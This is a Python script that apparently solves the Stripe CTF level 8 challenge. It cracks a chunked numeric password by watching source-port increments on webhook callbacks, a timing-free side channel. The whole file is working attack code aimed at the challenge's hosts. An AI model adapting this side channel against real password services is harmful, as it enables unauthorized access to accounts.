#!/usr/bin/env python

import SocketServer
import threading
import json
import sys
import os
import logging
import collections
from Queue import Queue

# Inser lib/ path into library path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "lib"))

import requests

log = logging.getLogger(__name__)


#: Public facing address
SERVER_HOST = "level02-3.stripe-ctf.com"
SERVER_PORT = 50112
#: URL to the PasswordDB server API endpoint.
PWDB_URL = "https://level08-1.stripe-ctf.com/user-wviepjncvg/"


# Synchronized queue for inter-thread communication
it_queue = Queue()
# Queue used inside the server-thread for communication between server and
# handler.
server_queue = Queue()


class RequestResult(object):
    def __init__(self, source_port):
        self.source_port = source_port
        self.success = None

    def __repr__(self):
        return "<RequestResult(source_port={0})>".format(self.source_port)


class WebhookServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):

    allow_reuse_address = True

    def __init__(self, server_address):
        # Haha, old-style classes, can't use super() here. :D
        SocketServer.TCPServer.__init__(self, server_address, WebhookHandler)

    def verify_request(self, request, client_address):
        result = RequestResult(client_address[1])
        server_queue.put(result)

        return True


class WebhookHandler(SocketServer.BaseRequestHandler):

    def handle(self):
        # Annotate the previous result with the success status.
        result = server_queue.get()

        data = self.request.recv(1024)
        lines = data.split('\r\n')
        try:
            success = json.loads(lines[-1])['success']
        except ValueError:
            success = False

        result.success = success
        it_queue.put(result)

        # No need to, but keeps the server log clean.
        self.request.sendall("HTTP/1.0 200 Ok\r\n\r\n")


class Client(object):
    """Client trying to break the password that is supposed to be 4 * 3
    characters, devided into same-length chunks.
    """

    PASSWORD_LENGTH = 12
    CHUNKS = 4
    #: Required confirmations before a value is considered considered (wrong)?
    CONFIRMATIONS = 2
    #: How many extra confirmations should it take to confirm a *good* value?
    EXTRA_CONFIRMATIONS = 1
    #: The minimum of source port increments, ie. a password with the first
    #: chunk wrong. This depends on your network configuration, required DNS
    #: lookups and so on.
    MIN_SOCKETS = 2
    #: How much weirdness until we go insane?
    INSANITY = 5

    def __init__(self):
        self.chunk = 0
        self.counter = 0
        self.verified_chunks = []
        self.weirdness = 0
        self.session = requests.session()

        self.delta_confirmer = DeltaConfirmer(self.CONFIRMATIONS,
                                              self.EXTRA_CONFIRMATIONS)


    def generate_pw(self):
        """Generate PW based on the current state, ie. current chunk,
        previously computed chunks and the current counter.
        """

        chunks = []
        for chunk_no in range(self.CHUNKS):
            if chunk_no < self.chunk:
                chunks.append(self.verified_chunks[chunk_no])
            elif chunk_no == self.chunk:
                chunks.append(str(self.counter).zfill(self.PASSWORD_LENGTH /
                                                      self.CHUNKS))
            else:
                chunks.append("000")

        return "".join(chunks)

    def run(self):
        webhooks = ["{0}:{1}".format(SERVER_HOST, SERVER_PORT)]

        while self.chunk < self.CHUNKS:
            pw = self.generate_pw()
            payload = json.dumps({"password": pw, "webhooks": webhooks})
            self.session.post(PWDB_URL, data=payload)

            # Block until we receive a result from the server thread.
            result = it_queue.get()

            if result.success:
                print("SUCCESS: {0}".format(self.generate_pw()))
                return

            delta, confident = self.delta_confirmer.confirm(result)
            log.debug("delta={0}, confident={1}, pw={2}".format(
                delta, confident, pw))
            # Not a stable data, run again.
            if delta < 1:
                continue

            self.consider_delta(delta, confident)

        sys.stderr.write("Could not find password. Is it non-numeric?")

    def consider_delta(self, delta, confident):
        if delta == (self.MIN_SOCKETS + self.chunk):
            self.counter += 1
        elif delta == (self.MIN_SOCKETS + self.chunk + 1):
            # Just once more.
            if not confident:
                return

            log.info("Found chunk #{0}. Current PW: {1}".format(
                self.chunk, self.generate_pw()))
            self.verified_chunks.append(str(self.counter))
            self.chunk += 1
            self.counter = 0
            self.delta_confirmer.reset()
            self.weirdness /= 2
        else:
            log.error("Weird delta={0} at chunk={1}. "
                          "Resetting current chunk state.".format(
                              delta, self.chunk))
            self.weirdness += 1
            self.counter = 0
            self.delta_confirmer.reset()

            if self.weirdness >= self.INSANITY:
                log.error("This is bat-shit crazy. Giving up.")
                sys.exit(1)


class DeltaConfirmer(object):

    def __init__(self, confirmations, extra=0):
        self.confirmations = confirmations
        self.extra = extra
        self.last_source_port = 0

        self.reset()

    def reset(self):
        self.ringbuffer = collections.deque(maxlen=(self.confirmations +
                                                    self.extra))

    def confirm(self, result):
        """Calculate the delta from the result. Returns a tuple of

            (delta, confident)

        Where ``delta`` is either a positive value that has been repeated at
        the last ``self.confirmations`` times or a negative value indicating
        an irregular delta.

        Confident is True if the value also satisfies the extra checks.
        """

        delta = result.source_port - self.last_source_port
        self.last_source_port = result.source_port

        log.debug("source_port={0}, last_source_port={1}, "
                  "real_delta={2}".format(
                      result.source_port, self.last_source_port, delta))

        # Either first connect or counter reset
        if delta < 1:
            return (delta, False)

        self.ringbuffer.append(delta)

        if len(self.ringbuffer) == (self.confirmations + self.extra):
            value = self.ringbuffer[-1]
            sames = len(filter(lambda x: x == value, self.ringbuffer))

            if sames >= self.confirmations:
                return value, (sames == self.confirmations + self.extra)

        return (-1, False)


def start_server():
    log.debug("Starting server thread.")
    server = WebhookServer(("0.0.0.0", SERVER_PORT))
    server_thread = threading.Thread(target=server.serve_forever)

    # Exit when main thread exists
    server_thread.daemon = True
    server_thread.start()
    log.debug("Server thread started.")


if __name__ == "__main__":
    level = logging.WARNING

    if len(sys.argv) > 1 and sys.argv[1] == "-v":
        level = logging.INFO
    if len(sys.argv) > 1 and sys.argv[1] == "-d":
        level = logging.DEBUG

    log.setLevel(level=level)
    log.addHandler(logging.StreamHandler())

    start_server()

    client = Client()
    client.run()
